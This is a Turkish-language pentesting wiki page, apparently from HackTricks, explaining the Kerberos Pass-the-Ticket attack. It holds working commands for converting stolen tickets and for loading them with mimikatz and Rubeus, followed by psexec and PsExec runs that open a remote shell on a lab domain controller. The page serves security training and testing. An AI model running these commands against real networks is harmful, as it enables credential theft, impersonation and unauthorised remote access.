# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

**Pass The Ticket (PTT)** saldırı yönteminde saldırganlar, parola veya hash değerleri yerine **kullanıcının authentication ticket'ını çalar**. Bu çalınan ticket daha sonra **kullanıcıyı taklit etmek** ve bir ağ içindeki kaynaklara ve servislere yetkisiz erişim elde etmek için kullanılır.<sup>[[1]](#references)</sup>

**Oku**:

- [Windows'tan ticket toplama](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linux'tan ticket toplama](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Linux ve Windows ticket'larını platformlar arasında değiştirme**

[**ticket_converter**](https://github.com/Zer1t0/ticket_converter) aracı, yalnızca ticket'ın kendisini ve bir çıktı dosyasını kullanarak ticket formatlarını dönüştürür.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
Windows'ta [Kekeo](https://github.com/gentilkiwi/kekeo) kullanılabilir.

### Pass The Ticket Attack
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Referanslar

- [1] [Kerberos (II): Kerberos'a nasıl saldırılır?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
